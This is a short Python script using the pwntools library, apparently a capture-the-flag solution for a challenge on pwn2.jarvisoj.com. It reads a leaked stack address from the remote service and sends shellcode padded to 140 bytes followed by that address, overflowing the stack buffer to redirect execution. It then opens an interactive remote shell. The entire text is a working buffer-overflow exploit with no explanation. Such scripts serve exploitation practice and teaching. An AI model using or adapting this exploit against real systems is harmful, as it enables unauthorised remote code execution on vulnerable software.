from pwn import *

conn = remote('pwn2.jarvisoj.com', '9877')

shellcode = asm(shellcraft.sh())

shellcode_addr = conn.recvuntil('?', drop = True)
shellcode_addr = int(shellcode_addr[12:], 16)

payload = shellcode.ljust(140, 'a') + p32(shellcode_addr)

conn.send(payload)

conn.interactive()
